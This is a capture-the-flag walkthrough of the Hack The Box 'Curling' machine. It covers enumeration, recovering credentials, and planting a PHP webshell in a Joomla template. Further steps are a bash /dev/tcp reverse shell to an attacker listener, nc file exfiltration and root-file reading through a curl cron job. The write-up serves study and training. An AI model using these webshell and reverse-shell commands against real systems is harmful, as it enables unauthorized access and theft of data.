
#intro-to-dante #linux

# Enumeration

## nmap portscan

```
nmap -sC -sV curling.htb             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-12 04:21 EST
Nmap scan report for curling.htb (10.129.123.91)
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8ad169b490203ea7b65401eb68303aca (RSA)
|   256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA)
|_  256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.60 seconds
```

Apache 2.4.29

## brute force directories

### Feroxbuster simple enumeration

```
feroxbuster -u http://curling.htb -k
──────────────────────────────────────────────────
301      GET        9l       28w      315c http://curling.htb/components => http://curling.htb/components/
301      GET        9l       28w      311c http://curling.htb/images => http://curling.htb/images/
301      GET        9l       28w      313c http://curling.htb/includes => http://curling.htb/includes/
200      GET      361l     1051w        0c http://curling.htb/
301      GET        9l       28w      312c http://curling.htb/modules => http://curling.htb/modules/
301      GET        9l       28w      314c http://curling.htb/templates => http://curling.htb/templates/
301      GET        9l       28w      308c http://curling.htb/bin => http://curling.htb/bin/
301      GET        9l       28w      310c http://curling.htb/cache => http://curling.htb/cache/
301      GET        9l       28w      314c http://curling.htb/libraries => http://curling.htb/libraries/
301      GET        9l       28w      310c http://curling.htb/media => http://curling.htb/media/
301      GET        9l       28w      312c http://curling.htb/plugins => http://curling.htb/plugins/
301      GET        9l       28w      319c http://curling.htb/plugins/search => http://curling.htb/plugins/search/
301      GET        9l       28w      317c http://curling.htb/plugins/user => http://curling.htb/plugins/user/
301      GET        9l       28w      320c http://curling.htb/plugins/content => http://curling.htb/plugins/content/
301      GET        9l       28w      313c http://curling.htb/language => http://curling.htb/language/
301      GET        9l       28w      308c http://curling.htb/tmp => http://curling.htb/tmp/
301      GET        9l       28w      318c http://curling.htb/administrator => http://curling.htb/administrator/
301      GET        9l       28w      319c http://curling.htb/plugins/system => http://curling.htb/plugins/system/
301      GET        9l       28w      319c http://curling.htb/images/banners => http://curling.htb/images/banners/
301      GET        9l       28w      320c http://curling.htb/plugins/captcha => http://curling.htb/plugins/captcha/
301      GET        9l       28w      312c http://curling.htb/layouts => http://curling.htb/layouts/
301      GET        9l       28w      320c http://curling.htb/plugins/editors => http://curling.htb/plugins/editors/
301      GET        9l       28w      320c http://curling.htb/layouts/plugins => http://curling.htb/layouts/plugins/
301      GET        9l       28w      322c http://curling.htb/layouts/libraries => http://curling.htb/layouts/libraries/
301      GET        9l       28w      326c http://curling.htb/administrator/modules => http://curling.htb/administrator/modules/
301      GET        9l       28w      327c http://curling.htb/administrator/includes => http://curling.htb/administrator/includes/
301      GET        9l       28w      328c http://curling.htb/administrator/templates => http://curling.htb/administrator/templates/
301      GET        9l       28w      324c http://curling.htb/administrator/cache => http://curling.htb/administrator/cache/
301      GET        9l       28w      327c http://curling.htb/administrator/language => http://curling.htb/administrator/language/
301      GET        9l       28w      329c http://curling.htb/administrator/components => http://curling.htb/administrator/components/
301      GET        9l       28w      323c http://curling.htb/administrator/logs => http://curling.htb/administrator/logs/
301      GET        9l       28w      323c http://curling.htb/administrator/help => http://curling.htb/administrator/help/
301      GET        9l       28w      322c http://curling.htb/plugins/installer => http://curling.htb/plugins/installer/
301      GET        9l       28w      314c http://curling.htb/media/cms => http://curling.htb/media/cms/
301      GET        9l       28w      318c http://curling.htb/libraries/cms => http://curling.htb/libraries/cms/
301      GET        9l       28w      317c http://curling.htb/media/system => http://curling.htb/media/system/
301      GET        9l       28w      319c http://curling.htb/media/contacts => http://curling.htb/media/contacts/
301      GET        9l       28w      319c http://curling.htb/layouts/joomla => http://curling.htb/layouts/joomla/
301      GET        9l       28w      318c http://curling.htb/libraries/src => http://curling.htb/libraries/src/
301      GET        9l       28w      321c http://curling.htb/libraries/joomla => http://curling.htb/libraries/joomla/
301      GET        9l       28w      321c http://curling.htb/libraries/vendor => http://curling.htb/libraries/vendor/
301      GET        9l       28w      323c http://curling.htb/libraries/cms/html => http://curling.htb/libraries/cms/html/
301      GET        9l       28w      318c http://curling.htb/media/editors => http://curling.htb/media/editors/
301      GET        9l       28w      324c http://curling.htb/libraries/cms/class => http://curling.htb/libraries/cms/class/
301      GET        9l       28w      322c http://curling.htb/plugins/extension => http://curling.htb/plugins/extension/

```


### Ferox buster php
Home has php so we also try to enumerate php extension
http://curling.htb/index.php

```
feroxbuster -u http://curling.htb -x php
301      GET        9l       28w      308c http://curling.htb/tmp => http://curling.htb/tmp/
301      GET        9l       28w      311c http://curling.htb/images => http://curling.htb/images/
301      GET        9l       28w      313c http://curling.htb/includes => http://curling.htb/includes/
301      GET        9l       28w      312c http://curling.htb/modules => http://curling.htb/modules/
301      GET        9l       28w      314c http://curling.htb/templates => http://curling.htb/templates/
301      GET        9l       28w      310c http://curling.htb/cache => http://curling.htb/cache/
301      GET        9l       28w      312c http://curling.htb/plugins => http://curling.htb/plugins/
301      GET        9l       28w      310c http://curling.htb/media => http://curling.htb/media/
301      GET        9l       28w      318c http://curling.htb/administrator => http://curling.htb/administrator/
301      GET        9l       28w      315c http://curling.htb/components => http://curling.htb/components/
301      GET        9l       28w      314c http://curling.htb/libraries => http://curling.htb/libraries/
301      GET        9l       28w      308c http://curling.htb/bin => http://curling.htb/bin/
301      GET        9l       28w      313c http://curling.htb/language => http://curling.htb/language/
200      GET      361l     1051w        0c http://curling.htb/
403      GET        9l       28w      276c http://curling.htb/.php
200      GET      361l     1051w        0c http://curling.htb/index.php
301      GET        9l       28w      320c http://curling.htb/plugins/content => http://curling.htb/plugins/content/
301      GET        9l       28w      323c http://curling.htb/administrator/logs => http://curling.htb/administrator/logs/
301      GET        9l       28w      323c http://curling.htb/administrator/help => http://curling.htb/administrator/help/
301      GET        9l       28w      321c http://curling.htb/templates/system => http://curling.htb/templates/system/
301      GET        9l       28w      319c http://curling.htb/images/banners => http://curling.htb/images/banners/
301      GET        9l       28w      318c http://curling.htb/libraries/cms => http://curling.htb/libraries/cms/
200      GET        0l        0w        0c http://curling.htb/libraries/cms.php
301      GET        9l       28w      314c http://curling.htb/media/cms => http://curling.htb/media/cms/
301      GET        9l       28w      328c http://curling.htb/templates/system/images => http://curling.htb/templates/system/images/
301      GET        9l       28w      325c http://curling.htb/templates/system/css => http://curling.htb/templates/system/css/
301      GET        9l       28w      319c http://curling.htb/plugins/system => http://curling.htb/plugins/system/
301      GET        9l       28w      317c http://curling.htb/media/system => http://curling.htb/media/system/
403      GET        9l       28w      276c http://curling.htb/administrator/.php
403      GET        9l       28w      276c http://curling.htb/templates/.php
301      GET        9l       28w      319c http://curling.htb/media/contacts => http://curling.htb/media/contacts/
200      GET        2l        2w       13c http://curling.htb/administrator/logs/error.php
200      GET        0l        0w        0c http://curling.htb/templates/system/error.php
200      GET      109l      348w     5107c http://curling.htb/administrator/index.php
301      GET        9l       28w      326c http://curling.htb/templates/system/html => http://curling.htb/templates/system/html/
301      GET        9l       28w      320c http://curling.htb/plugins/captcha => http://curling.htb/plugins/captcha/
200      GET        0l        0w        0c http://curling.htb/libraries/import.php
200      GET        0l        0w        0c http://curling.htb/templates/system/component.php
301      GET        9l       28w      319c http://curling.htb/plugins/finder => http://curling.htb/plugins/finder/
301      GET        9l       28w      330c http://curling.htb/plugins/finder/categories => http://curling.htb/plugins/finder/categories/

```

## Check the website

### posts
There are some posts by Super user and Floris

```
Hey this is the first post on this amazing website! Stay tuned for more amazing content! curling2018 for the win!

- Floris
```

It is possible that curling2018 is a password for something.

### Source code

Under `http://curling.htb/`
```
<script type="application/json" class="joomla-script-options new">{"csrf.token":"828b88f084f24f23cd913d887201d7be","system.paths":{"root":"","base":""},"system.keepalive":{"interval":840000,"uri":"\/index.php\/component\/ajax\/?format=json"}}</script>
```

```
<script>
jQuery(window).on('load',  function() {
				new JCaption('img.caption');
			});
jQuery(function($){ initTooltips(); $("body").on("subform-row-add", initTooltips); function initTooltips (event, container) { container = container || document;$(container).find(".hasTooltip").tooltip({"html": true,"container": "body"});} });
	</script>
```

```
<input type="hidden" name="option" value="com_users" />
<input type="hidden" name="task" value="user.login" />
<input type="hidden" name="return" value="aHR0cDovL2N1cmxpbmcuaHRiLw==" />
<input type="hidden" name="828b88f084f24f23cd913d887201d7be" value="1" />
```

```
</body>
      <!-- secret.txt -->
</html>
```


### CMS
Joomla

I would like to know the version of Joomla

https://docs.joomla.org/How_to_check_the_Joomla_version%3F
https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http

lets curl it
```
curl http://curling.htb/administrator/manifests/files/joomla.xml                                                           
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2005 - 2018 Open Source Matters. All rights reserved</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>3.8.8</version>
        <creationDate>May 2018</creationDate>
        <description>FILES_JOOMLA_XML_DESCRIPTION</description>

        <scriptfile>administrator/components/com_admin/script.php</scriptfile>

        <update>
                <schemas>
                        <schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
                        <schemapath type="sqlsrv">administrator/components/com_admin/sql/updates/sqlazure</schemapath>
                        <schemapath type="sqlazure">administrator/components/com_admin/sql/updates/sqlazure</schemapath>
                        <schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
                </schemas>
        </update>

        <fileset>
                <files>
                        <folder>administrator</folder>
                        <folder>bin</folder>
                        <folder>cache</folder>
                        <folder>cli</folder>
                        <folder>components</folder>
                        <folder>images</folder>
                        <folder>includes</folder>
                        <folder>language</folder>
                        <folder>layouts</folder>
                        <folder>libraries</folder>
                        <folder>media</folder>
                        <folder>modules</folder>
                        <folder>plugins</folder>
                        <folder>templates</folder>
                        <folder>tmp</folder>
                        <file>htaccess.txt</file>
                        <file>web.config.txt</file>
                        <file>LICENSE.txt</file>
                        <file>README.txt</file>
                        <file>index.php</file>
                </files>
        </fileset>

        <updateservers>
                <server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
        </updateservers>
</extension>
                        
```

extension version 3.6, version 3.8.8?

### Searchsploit

Check both 3.6 and 3.8
```
searchsploit joomla 3.6
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.4.4 < 3.6.4 - Account Creation / Privilege Escalation                                          | php/webapps/40637.txt
Joomla! < 3.6.4 - Admin Takeover                                                                         | php/webapps/41157.py
Joomla! Component BookLibrary 3.6.1 - SQL Injection                                                      | php/webapps/41430.txt
Joomla! Component com_jcalpro 1.5.3.6 - Remote File Inclusion                                            | php/webapps/10587.txt
Joomla! Component com_payplans 3.3.6 - SQL Injection                                                     | php/webapps/39936.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                            | php/webapps/43488.txt
Joomla! Component Form Maker 3.6.12 - SQL Injection                                                      | php/webapps/44111.txt
Joomla! Component Gallery WD 1.3.6 - SQL Injection                                                       | php/webapps/44112.txt
Joomla! Component Monthly Archive 3.6.4 - 'author_form' SQL Injection                                    | php/webapps/41505.txt
Joomla! Component Spider Contacts 1.3.6 - 'contacts_id' SQL Injection                                    | php/webapps/34625.py
Joomla! Component Timetable Schedule 3.6.8 - SQL Injection                                               | php/webapps/45478.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```
searchsploit joomla 3.8
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! Component Appointments for JomSocial 3.8.1 - SQL Injection                                       | php/webapps/41462.txt
Joomla! Component ContentMap 1.3.8 - 'contentid' SQL Injection                                           | php/webapps/41427.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                            | php/webapps/43488.txt
Joomla! Component Reverse Auction Factory 4.3.8 - SQL Injection                                          | php/webapps/45475.txt
Joomla! Component Social Factory 3.8.3 - SQL Injection                                                   | php/webapps/45470.txt
Joomla! Component Store for K2 3.8.2 - SQL Injection                                                     | php/webapps/41440.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### secret.txt

https://gchq.github.io/CyberChef/
`Q3VybGluZzIwMTgh` -> `Curling2018!`
It is base64 according to cyberchef's result


### Login

Try `Frolis:Curling2018!` in the login form.

From feroxbuster, we know that administrator page exists.
We can login there too using the same credential


# Foothold
## Getting webshell
### Joomla CMS

Under `Extensions` -> `Templates` -> `Templates`, we can add some files to the existing templates.
We can try to add revshell written in php and access it.

![[Pasted image 20230212190341.png]]
In revshell.php
`<?php system($_GET['0xdf']); ?>`

Access `http://curling.htb/templates/beez3/revshell.php?0xdf=whoami`
![[Pasted image 20230212193935.png]]

If we prepare reverse shell code in revshell.php then we can probably get the shell.


## Reverse shell as www-data

`<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.28/1234 0>&1'");`

and listen in the kali machine
`nc -lnvp 1234`

### Upgrade shell
`script -qc /bin/bash /dev/null`


## Check files

## home/floris
```
drwxr-xr-x 6 floris floris 4096 Aug  2  2022 .
drwxr-xr-x 3 root   root   4096 Aug  2  2022 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 Aug  2  2022 .cache
drwx------ 3 floris floris 4096 Aug  2  2022 .gnupg
drwxrwxr-x 3 floris floris 4096 Aug  2  2022 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4096 Aug  2  2022 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 Feb 12 09:08 user.txt
```

```
cat password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

### download this file locally

on kali
```
nc -lvp 4444 > password_backup  
```

on wwwdata
```
nc 10.10.14.28 4444 -w 3 < password_backup
```

### Hexdump to password.txt

`password_backup` is a hexdump, so we convert it to binary.

Notice that the first three bytes are `42 5A 68`, therefore it is bz2
https://en.wikipedia.org/wiki/List_of_file_signatures

`mv password_backup password_backup_original`
#### hexdump to bz2
`cat password_backup_origianl | xxd -r > password_backup.bz2`

#### bunzip2 to gunzip
`bunzip2 -k password_backup.bz2`
`mv password_backup password_backup.gz`

#### gunzip to bunzip2
`gunzip -k password_backup.gz`
`mv password_backup password_backup2.bz2`

#### bunzip2 to tar
`bunzip2 -k password_backup.bz2`
`mv password_backup2 password_backup.tar`

#### tar to password.txt
`tar xvf password_backup.tar`

#### password.txt                     
`5d<wdCbdZu)|hChXll`


## su to floris
Now we can get the userflag.
SSH is available as well.

# Priviledge Escalation
## Enumeration
### Run pspy
Upload pspy binary from https://github.com/DominicBreuker/pspy.

![[Pasted image 20230212231649.png]]

We know that curl is running.

## Get root flag through curl

We know that curl is running periodically, and we can look at local files using curl as well.
```
curl file:///home/floris/user.txt
4563011c07b520cdad384077d5f99263
floris@curling:~$ cat user.txt
4563011c07b520cdad384077d5f99263
```

For example, floris's user flag can be referenced using either curl or cat.
We can replace the admin-area's input file to a local file.

`url = "file:///root/root.txt"`
After a while, we should see the report file.

```
cat report
2ffca8dad823e354d1079f51799510be
```



